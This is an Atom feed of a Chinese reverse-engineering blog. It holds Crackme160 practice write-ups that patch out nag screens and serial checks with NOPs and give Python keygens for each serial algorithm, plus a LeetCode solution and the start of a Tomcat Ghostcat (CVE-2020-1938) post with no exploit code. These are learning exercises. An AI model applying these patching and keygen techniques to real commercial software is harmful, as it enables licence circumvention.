<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Crustsalt&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2021-11-04T10:03:11.244Z</updated>
  <id>/</id>
  
  <author>
    <name>Crustsalt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Crackme 160-3 AfKayAs.2 分析及注册机编写</title>
    <link href="/2021/11/04/Crackme%20160-3%20AfKayAs.2%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/"/>
    <id>/2021/11/04/Crackme 160-3 AfKayAs.2 分析及注册机编写/</id>
    <published>2021-11-04T10:03:52.000Z</published>
    <updated>2021-11-04T10:03:11.244Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Crackme-160-3-AfKayAs-2-分析及注册机编写"><a href="#Crackme-160-3-AfKayAs-2-分析及注册机编写" class="headerlink" title="Crackme 160-3 AfKayAs.2 分析及注册机编写"></a><strong>Crackme 160-3 AfKayAs.2 分析及注册机编写</strong></h3><p>先展示一下软件界面。先是会显示这样一个窗口，等待一段时间后会变更为下一个界面。</p><a id="more"></a><p><img src="https://i.loli.net/2021/11/01/9rYTPdZOksK2Ec5.jpg" alt="1.jpg"></p><p><img src="https://i.loli.net/2021/11/01/ZYPymKoR1GCJ2Dv.jpg" alt="2.jpg"></p><p><img src="https://i.loli.net/2021/11/01/7U5Brqxn9vyoXzh.jpg" alt="4.jpg"></p><p>与上一个不同的是这里的注册码是浮点数，如果输入的不是浮点数直接提示run time error 类型不匹配，然后输入name和注册码匹配的话，会如上一个crackme一样弹出正确，否则弹出错误，这里就不放对应的截图了。</p><hr><h4 id="去开屏动画"><a href="#去开屏动画" class="headerlink" title="去开屏动画"></a><strong>去开屏动画</strong></h4><p>这个不太会，不知道为什么F7没有找到开屏广告启动的地方。</p><p>根据网上教程采用4C法去nag。</p><p>首先是vb程序的特点：程序入口会有一个push，然后进行一次call。</p><p><img src="https://i.loli.net/2021/11/04/FIcXbqMaNBLjnsR.jpg" alt="QQ截图20211104174321.jpg"></p><p>然后把要压栈的地址+0x4C，即0x4067D4+0x4C=0x406820。</p><p>在数据窗口找到该地址。</p><p><img src="https://i.loli.net/2021/11/04/avW67putgsIFBHO.jpg" alt="QQ截图20211104174707.jpg"></p><p>如图可见该地址的Dword值为0x00406868，继续跟踪可得</p><p><img src="https://i.loli.net/2021/11/04/KrsN1v5THalhGUA.jpg" alt="QQ截图20211104175708.jpg"></p><p>如图可见两个几乎一样的块。每块50(十六进制)个字节的长度,每块数据的第24(十六进制)个字节处都有一个标志（第一个是01，第二个是00）。该标志指定了每块代码（也就是程序启动后要加载的窗体）出现的顺序，先加载00，也就是我们要去的NAG窗口，再加载01，是主窗口。所以这里我们将各两个标志的值颠倒一下，01改00，00改01，二进制修改，保存文件，运行测试，NAG窗口去除了。</p><hr><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a><strong>注册机编写</strong></h4><p>类似之前的步骤，以下是关键代码截图。</p><p>首先获取字符串长度，然后长度乘以0x15B38，获取输入的name的第一个字符的ascii码，把刚刚算出来的结果加上ascii码后再加2，算出来结果后再乘以3，最后再-2，最后再加15</p><p><img src="https://i.loli.net/2021/11/03/6AOkQ5da9RoqCzG.jpg" alt="10.jpg"></p><p><img src="https://i.loli.net/2021/11/03/3MBfwIqXO59DQzc.jpg" alt="5.jpg"></p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/11/03/V8BUptn9Er4FOTP.jpg" alt="6.jpg"></h4><p><img src="https://i.loli.net/2021/11/03/mf1YIiwbo9BxOJk.jpg" alt="11.jpg"></p><p><img src="https://i.loli.net/2021/11/03/BTDLnKmZWiXJ4Hj.jpg" alt="7.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"Crustsalt"</span></span><br><span class="line">length = len(name)</span><br><span class="line">edi = length * <span class="number">0x15B38</span></span><br><span class="line">edi = edi + ord(name[<span class="number">0</span>])</span><br><span class="line">edi = edi + <span class="number">2</span></span><br><span class="line">edi = edi * <span class="number">3</span></span><br><span class="line">edi = edi - <span class="number">2</span></span><br><span class="line">edi = edi + <span class="number">15</span></span><br><span class="line">print(edi)</span><br></pre></td></tr></table></figure><p>但是有一点还是需要学一下，比如浮点数在内存中是怎么存储的，如果内存里切换成十六进制的方式显示为如下，但如果切换成64位双精度浮点则可以看见计算注册码需要的数值。以后遇到浮点数相关题目需要切换内存数据的显示方式，写完这篇blog后，我再去好好学一下内存里数据到底是怎么存储的。</p><p><img src="https://i.loli.net/2021/11/03/CGgz7R3c8DTAym4.jpg" alt="QQ截图20211103222421.jpg"></p><p><img src="https://i.loli.net/2021/11/03/74xRzt8n9uBQGYy.jpg" alt="QQ截图20211103231610.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Crackme-160-3-AfKayAs-2-分析及注册机编写&quot;&gt;&lt;a href=&quot;#Crackme-160-3-AfKayAs-2-分析及注册机编写&quot; class=&quot;headerlink&quot; title=&quot;Crackme 160-3 AfKayAs.2 分析及注册机编写&quot;&gt;&lt;/a&gt;&lt;strong&gt;Crackme 160-3 AfKayAs.2 分析及注册机编写&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;先展示一下软件界面。先是会显示这样一个窗口，等待一段时间后会变更为下一个界面。&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向工程" scheme="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="逆向工程" scheme="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="Crackme160" scheme="/tags/Crackme160/"/>
    
  </entry>
  
  <entry>
    <title>Crackme 160-2 Afkayas.1 分析及注册机编写</title>
    <link href="/2021/10/31/Crackme%20160-2%20Afkayas.1%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/"/>
    <id>/2021/10/31/Crackme 160-2 Afkayas.1 分析及注册机编写/</id>
    <published>2021-10-31T15:46:50.000Z</published>
    <updated>2021-11-01T15:11:37.898Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Crackme-160-2-Afkayas-1-分析及注册机编写"><a href="#Crackme-160-2-Afkayas-1-分析及注册机编写" class="headerlink" title="Crackme 160-2 Afkayas.1 分析及注册机编写"></a><strong>Crackme 160-2 Afkayas.1 分析及注册机编写</strong></h2><p>这是Crackme160中的第二个程序，先展示一下软件界面。<br><a id="more"></a><br><img src="https://i.loli.net/2021/10/31/XHC2DrUdWgJy8KM.jpg" alt="1.jpg"></p><p>输入name，然后输入注册码，然后比较注册码正确与否，正确和错误会有不同的弹窗。下图分别为正确和错误弹窗。</p><p><img src="https://i.loli.net/2021/10/31/3MTkhIaQW6AJgEX.jpg" alt="2.jpg"></p><p><img src="https://i.loli.net/2021/10/31/u4AQGSFWsEVz85g.jpg" alt="3.jpg"></p><hr><h3 id="绕过注册码检测"><a href="#绕过注册码检测" class="headerlink" title="绕过注册码检测"></a><strong>绕过注册码检测</strong></h3><p>还是老规矩，搜搜字符串，发现弹出字符前有个je跳转，把je改成nop指令即可，这块有手就行。</p><p><img src="https://i.loli.net/2021/10/31/JKdkQ6CaqZgy2vH.jpg" alt="4.jpg"></p><hr><h3 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a><strong>注册机编写</strong></h3><p>问题是这个注册机怎么写，我辛苦F8了一下午一晚上，理出了点头绪，最后还是借鉴了一下网上的教程。这里是主要的反汇编代码。其流程如下：</p><ol><li>赋予eax一个初值</li><li>edi = eax</li><li>edi = edi*0x17CFB</li><li>edx = 所输入name字符串第一位的ascii码</li><li>edi = edi + edx</li><li>edi转换为十进制</li></ol><p><img src="https://i.loli.net/2021/10/31/ErITjuhV81lpkX9.jpg" alt="5.jpg"></p><p><img src="https://i.loli.net/2021/10/31/GURPD6lftqcpA7r.jpg" alt="6.jpg"></p><p>上图为反汇编代码中转换为十进制的循环，我楞是没看出来这是转换进制的代码，我还以为是生成注册码的一部分……</p><p>现在问题来了，初值是什么，经过F8可以得知，初值其实是输入的name地址-0x4的一个值，我猜他是和输入的字符串有关，但是经过好几个字符串的测试没看出来有什么关联，看了网上教程才知道这个初值其实是输入字符串的长度，其实看vb的函数名就能猜出来…这告诉我们下次要记得看函数名，会改变eax初值的call名字叫vbaLenBstr，其实是获取字符串长度的函数，与之类似的还有以下这些：</p><table><thead><tr><th><strong>WideCHatToMultiByte</strong></th><th><strong>将UNICODE字符转换成ANSI字符</strong></th></tr></thead><tbody><tr><td><strong>rtcT8ValFromBstr</strong></td><td><strong>把字符转换成浮点数</strong></td></tr><tr><td><strong>vbaStrCmp</strong></td><td><strong>比较字符串（常用断点）</strong></td></tr><tr><td><strong>vbaStrComp</strong></td><td><strong>字符串比较（常用断点）</strong></td></tr><tr><td><strong>vbaStrCopy</strong></td><td><strong>复制字符串</strong></td></tr><tr><td><strong>StrConv</strong></td><td><strong>转换字符串</strong></td></tr><tr><td><strong>vbaStrMove</strong></td><td><strong>移动字符串</strong></td></tr><tr><td><strong>vbaVarCat</strong></td><td><strong>连接字符串</strong></td></tr><tr><td><strong>rtcMidCharVar</strong></td><td><strong>在字符串中取字符或者字符串</strong></td></tr><tr><td><strong>vbaLenBstr</strong></td><td><strong>取字符串的长度</strong></td></tr><tr><td><strong>vbaVarTstNe</strong></td><td><strong>变量比较</strong></td></tr><tr><td><strong>vbaVarTstEq</strong></td><td><strong>变量比较</strong></td></tr><tr><td><strong>rtcMsgBox</strong></td><td><strong>显示对话框</strong></td></tr><tr><td><strong>VarBstrCmp</strong></td><td><strong>比较字符串</strong></td></tr><tr><td><strong>VarCyCmp</strong></td><td><strong>比较字符串</strong></td></tr></tbody></table><p>下次看名字就知道这个call是干什么的了，不用一点点F7头秃了。</p><p>最后附上自己写的注册机，一个是自己写的注释多一些的，另一个是精简版代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#繁琐并且没有什么用只是看汇编的时候顺手写的然后再顺手传上来而已</span></span><br><span class="line"><span class="comment">#获取name的第一位</span></span><br><span class="line"><span class="comment">#name = input("name= ")</span></span><br><span class="line">name=<span class="string">"Crustsalt"</span></span><br><span class="line">length=len(name)*<span class="number">2</span></span><br><span class="line">tmp = ord(name[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#对eax进行处理</span></span><br><span class="line">eax = length&gt;&gt;<span class="number">1</span></span><br><span class="line">edi = eax*<span class="number">0x17CFB</span></span><br><span class="line">begin = edi + tmp</span><br><span class="line">print(<span class="string">'AKA-'</span>+str(begin))</span><br><span class="line"><span class="comment">#以下部分可以不需要，只是进制转换，但实际上python默认输出的就是十进制，故上面的print和下面的print输出结果是一样的，这里只是当初看反汇编的时候顺手写了而已</span></span><br><span class="line">serial = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    result = begin//<span class="number">0xA</span></span><br><span class="line">    num = begin%<span class="number">10</span></span><br><span class="line">    begin = result</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> begin):</span><br><span class="line">        serial = serial + chr(num+<span class="number">0x30</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    serial = serial + chr(num+<span class="number">0x30</span>)</span><br><span class="line">print(<span class="string">'AKA-'</span>+str(serial[::<span class="number">-1</span>]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#精简的只有这一条注释</span></span><br><span class="line">name = input(<span class="string">"name= "</span>)</span><br><span class="line">length=len(name)</span><br><span class="line">tmp = ord(name[<span class="number">0</span>])</span><br><span class="line">edi = length*<span class="number">0x17CFB</span></span><br><span class="line">begin = edi + tmp</span><br><span class="line">print(<span class="string">'AKA-'</span>+str(begin))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Crackme-160-2-Afkayas-1-分析及注册机编写&quot;&gt;&lt;a href=&quot;#Crackme-160-2-Afkayas-1-分析及注册机编写&quot; class=&quot;headerlink&quot; title=&quot;Crackme 160-2 Afkayas.1 分析及注册机编写&quot;&gt;&lt;/a&gt;&lt;strong&gt;Crackme 160-2 Afkayas.1 分析及注册机编写&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;这是Crackme160中的第二个程序，先展示一下软件界面。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向工程" scheme="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="逆向工程" scheme="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="Crackme160" scheme="/tags/Crackme160/"/>
    
  </entry>
  
  <entry>
    <title>Crackme 160-1 Acid burn 分析及注册机编写</title>
    <link href="/2021/10/26/Crackme%20160-1%20Acid%20burn%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/"/>
    <id>/2021/10/26/Crackme 160-1 Acid burn 分析及注册机编写/</id>
    <published>2021-10-26T13:28:12.000Z</published>
    <updated>2021-10-31T15:10:52.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Crackme-160-1-Acid-burn-分析及注册机编写"><a href="#Crackme-160-1-Acid-burn-分析及注册机编写" class="headerlink" title="Crackme 160-1 Acid burn 分析及注册机编写"></a><strong>Crackme 160-1 Acid burn 分析及注册机编写</strong></h2><p>近来正在努力学逆向，所以打算从crackme160入手，这篇是第一个程序的分析。  </p><p>CrackMe160 是比较适合新手学习逆向破解的CrackMe的一个集合一共160个待逆向破解的程序</p><a id="more"></a><hr><p>先展示一下软件界面。</p><p><img src="https://i.loli.net/2021/10/26/Rj8FoQ9PLqtvXue.jpg" alt="0.jpg"></p><p><img src="https://i.loli.net/2021/10/26/minCWr2Z8RsPgNq.jpg" alt="0_1.jpg"></p><p><img src="https://i.loli.net/2021/10/26/JzwMdCqakQDyhZ2.jpg" alt="0_2.jpg"></p><hr><h3 id="去弹窗"><a href="#去弹窗" class="headerlink" title="去弹窗"></a><strong>去弹窗</strong></h3><p>该程序打开后会出现一个弹窗，首先要先把弹窗去掉。</p><p><img src="https://i.loli.net/2021/10/26/lO8UdwE512Aetok.png" alt="这是那个弹窗"></p><p>使用OllyDbg进行调试，先使用F8，当F8步过哪个call出现弹窗时，即说明弹窗代码在哪一部分。这里也可以使用messagebox处下断点的方法一点点找。</p><p>经过F8步过，发现弹窗函数在断点所示call内。</p><p><img src="https://i.loli.net/2021/10/26/iOxEDsbkS2WclAU.jpg" alt="2.jpg"></p><p><img src="https://i.loli.net/2021/10/26/xPWBfrHnoy9hD3E.jpg" alt="3.jpg"></p><p><img src="https://i.loli.net/2021/10/26/iX1elFkDaQ3Lndy.jpg" alt="4.jpg"></p><p>如下图所示，messagebox所需参数在这里，只需把retn指令上面的部分全部由nop替换即可，经测试nop后不弹窗了</p><p><img src="https://i.loli.net/2021/10/26/TYgz76PJnAqO5ke.jpg" alt="5.jpg"></p><p><img src="https://i.loli.net/2021/10/26/PoQzAYKOvk7tani.jpg" alt="6.jpg"></p><hr><h3 id="序列码生成即绕过检测"><a href="#序列码生成即绕过检测" class="headerlink" title="序列码生成即绕过检测"></a><strong>序列码生成即绕过检测</strong></h3><p>序列码绕过检测很容易，直接经过读汇编代码可以发现如下图所示地方。</p><p>下图中jnz会跳转到失败的地方，只要把jnz指令进行nop即可跳转到成功，绕过还是很好绕过的，主要是注册机写法。</p><p><img src="https://i.loli.net/2021/10/26/2lapQSConwVXgBW.jpg" alt="8.jpg"></p><p>注册码分为两部分，一个是固定字符串，一个是根据name动态生成的数字，将两部分连接起来就是注册码。  </p><p>注册码生成很玄学，实际上在这里就已经生成完毕了。经过如下代码，已经会在eax中生成对应的注册码的可变部分了。只不过在这里没有写到堆栈里。  </p><p><img src="https://i.loli.net/2021/10/26/fYmAUrgbX3TxIv1.jpg" alt="9.jpg"></p><p>根据网上的说法，下图为注册码生成部分函数。一开始我也以为这里是注册码生成部分，因为运行这里的汇编代码的时候，会不停的循环，很符合心目中生成注册码的样子，但继而我就发现事情不对劲了，在进入这个函数前的某个代码部分，我就发现了EAX中的值为注册码，刚开始我以为是偶然，然后换了几次name进行测试，EAX中的值确实为注册码中间可变部分的十六进制。于是我接着往前找，就找到了上图部分所示代码。上图的注册码生成在下图之前，下图又进行了某些操作后，把注册码写进了堆栈。所以注册机写法只需要上图所示的一点代码即可。</p><p><img src="https://i.loli.net/2021/10/26/kpX6enlZzxKC8H1.jpg" alt="10.jpg"></p><p><img src="https://i.loli.net/2021/10/26/6vjC2TKm7xPwaFt.jpg" alt="11.jpg"></p><p>以下为注册机生成代码，经过实测验证，生成的注册码均为正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = input(<span class="string">"please input name"</span>)</span><br><span class="line">key = name[<span class="number">1</span>]</span><br><span class="line">result = ord(key) * <span class="number">0x29</span> *<span class="number">2</span></span><br><span class="line">print(<span class="string">'&#123;num&#125;:CW-&#123;result&#125;-CRACKED'</span>.format(num=i,result=result))</span><br></pre></td></tr></table></figure><p>终于搞定了个简单的crackme160，搞了快一天，被网上教程误导了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Crackme-160-1-Acid-burn-分析及注册机编写&quot;&gt;&lt;a href=&quot;#Crackme-160-1-Acid-burn-分析及注册机编写&quot; class=&quot;headerlink&quot; title=&quot;Crackme 160-1 Acid burn 分析及注册机编写&quot;&gt;&lt;/a&gt;&lt;strong&gt;Crackme 160-1 Acid burn 分析及注册机编写&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;近来正在努力学逆向，所以打算从crackme160入手，这篇是第一个程序的分析。  &lt;/p&gt;
&lt;p&gt;CrackMe160 是比较适合新手学习逆向破解的CrackMe的一个集合一共160个待逆向破解的程序&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向工程" scheme="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="逆向工程" scheme="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="Crackme160" scheme="/tags/Crackme160/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="/2021/09/06/Leetcode%201/"/>
    <id>/2021/09/06/Leetcode 1/</id>
    <published>2021-09-06T12:13:38.211Z</published>
    <updated>2020-10-01T09:32:29.646Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Leetcode每日一题（2020-10-1）"><a href="#Leetcode每日一题（2020-10-1）" class="headerlink" title="Leetcode每日一题（2020-10-1）"></a>Leetcode每日一题（2020-10-1）</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>小扣出去秋游，途中收集了一些红叶和黄叶，他利用这些叶子初步整理了一份秋叶收藏集 leaves， 字符串 leaves 仅包含小写字符 r 和 y， 其中字符 r 表示一片红叶，字符 y 表示一片黄叶。出于美观整齐的考虑，小扣想要将收藏集中树叶的排列调整成「红、黄、红」三部分。每部分树叶数量可以不相等，但均需大于等于 1。每次调整操作，小扣可以将一片红叶替换成黄叶或者将一片黄叶替换成红叶。请问小扣最少需要多少次调整操作才能将秋叶收藏集调整完毕。</p></blockquote><a id="more"></a><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例 <span class="number">1</span>：</span><br><span class="line"></span><br><span class="line">输入：leaves = <span class="string">"rrryyyrryyyrr"</span></span><br><span class="line"></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line"></span><br><span class="line">解释：调整两次，将中间的两片红叶替换成黄叶，得到 <span class="string">"rrryyyyyyyyrr"</span></span><br><span class="line"></span><br><span class="line">示例 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line">输入：leaves = <span class="string">"ryr"</span></span><br><span class="line"></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line"></span><br><span class="line">解释：已符合要求，不需要额外操作</span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> &lt;= leaves.length &lt;= <span class="number">10</span>^<span class="number">5</span></span><br><span class="line">leaves 中只包含字符 'r' 和字符 'y'</span><br></pre></td></tr></table></figure><hr><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这个题说实话我没有什么思路，感觉没有什么特别好的方法，无非就是异常情况，比如</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">把所有树叶分成三块，ryr各为一块，然后每一块会有两种情况，rr\yy\yr\ry(仅仅代表可能会有的树叶种类)</span><br><span class="line">rr..<span class="selector-class">.yy</span>...rr</span><br><span class="line">rr..<span class="selector-class">.yy</span>...yy</span><br><span class="line">rr..<span class="selector-class">.yy</span>...ry</span><br><span class="line">rr..<span class="selector-class">.yy</span>...yr</span><br><span class="line">以此类推，如果硬是这么做是能做出来的，但是太过繁琐也没有什么技术含量，所以我觉得应该学习一下大佬们的解法。</span><br></pre></td></tr></table></figure><h4 id="方法一-动态规划"><a href="#方法一-动态规划" class="headerlink" title="方法一 动态规划"></a>方法一 动态规划</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">minimumOperations</span><span class="params">(self, leaves: str)</span> -&gt; int:</span></span><br><span class="line">       n = len(leaves)</span><br><span class="line">       f = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)]</span><br><span class="line">       f[<span class="number">0</span>][<span class="number">0</span>] = int(leaves[<span class="number">0</span>] == <span class="string">"y"</span>)</span><br><span class="line">       f[<span class="number">0</span>][<span class="number">1</span>] = f[<span class="number">0</span>][<span class="number">2</span>] = f[<span class="number">1</span>][<span class="number">2</span>] = float(<span class="string">"inf"</span>)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">           isRed = int(leaves[i] == <span class="string">"r"</span>)</span><br><span class="line">           isYellow = int(leaves[i] == <span class="string">"y"</span>)</span><br><span class="line">           f[i][<span class="number">0</span>] = f[i - <span class="number">1</span>][<span class="number">0</span>] + isYellow</span><br><span class="line">           f[i][<span class="number">1</span>] = min(f[i - <span class="number">1</span>][<span class="number">0</span>], f[i - <span class="number">1</span>][<span class="number">1</span>]) + isRed</span><br><span class="line">           <span class="keyword">if</span> i &gt;= <span class="number">2</span>:</span><br><span class="line">               f[i][<span class="number">2</span>] = min(f[i - <span class="number">1</span>][<span class="number">1</span>], f[i - <span class="number">1</span>][<span class="number">2</span>]) + isYellow</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> f[n - <span class="number">1</span>][<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>方法二 前缀和 + 动态规划</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimumOperations</span><span class="params">(self, leaves: str)</span> -&gt; int:</span></span><br><span class="line">        n = len(leaves)</span><br><span class="line">        g = (<span class="number">1</span> <span class="keyword">if</span> leaves[<span class="number">0</span>] == <span class="string">"y"</span> <span class="keyword">else</span> <span class="number">-1</span>)</span><br><span class="line">        gmin = g</span><br><span class="line">        ans = float(<span class="string">"inf"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            isYellow = int(leaves[i] == <span class="string">"y"</span>)</span><br><span class="line">            g += <span class="number">2</span> * isYellow - <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i != n - <span class="number">1</span>:</span><br><span class="line">                ans = min(ans, gmin - g)</span><br><span class="line">            gmin = min(gmin, g)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans + (g + n) // <span class="number">2</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Leetcode每日一题（2020-10-1）&quot;&gt;&lt;a href=&quot;#Leetcode每日一题（2020-10-1）&quot; class=&quot;headerlink&quot; title=&quot;Leetcode每日一题（2020-10-1）&quot;&gt;&lt;/a&gt;Leetcode每日一题（2020-10-1）&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;小扣出去秋游，途中收集了一些红叶和黄叶，他利用这些叶子初步整理了一份秋叶收藏集 leaves， 字符串 leaves 仅包含小写字符 r 和 y， 其中字符 r 表示一片红叶，字符 y 表示一片黄叶。出于美观整齐的考虑，小扣想要将收藏集中树叶的排列调整成「红、黄、红」三部分。每部分树叶数量可以不相等，但均需大于等于 1。每次调整操作，小扣可以将一片红叶替换成黄叶或者将一片黄叶替换成红叶。请问小扣最少需要多少次调整操作才能将秋叶收藏集调整完毕。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-1938</title>
    <link href="/2020/02/24/Tomcat%20Ajp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
    <id>/2020/02/24/Tomcat Ajp漏洞复现（CVE-2020-1938）/</id>
    <published>2020-02-24T14:11:22.000Z</published>
    <updated>2020-02-24T14:20:01.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）"><a href="#Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）" class="headerlink" title="Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）"></a>Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）</h2><p>最近的新漏洞，复现一下。</p><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>漏洞简介<br>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。<br>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938</a></p><p>影响范围<br>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP 